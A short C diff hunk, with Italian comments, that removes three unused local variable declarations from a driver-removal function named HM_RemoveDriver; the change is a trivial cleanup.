@@ -368,9 +368,6 @@ BOOL IsLastInstance()
 // Rimuove il driver dal sistema 
 void HM_RemoveDriver()
 {
-	int i;
-	WCHAR *subkey;
-	WCHAR src_drv[MAX_PATH];
 	HideDevice reg_device;
 
 	// Rimuove le chiavi nel registry
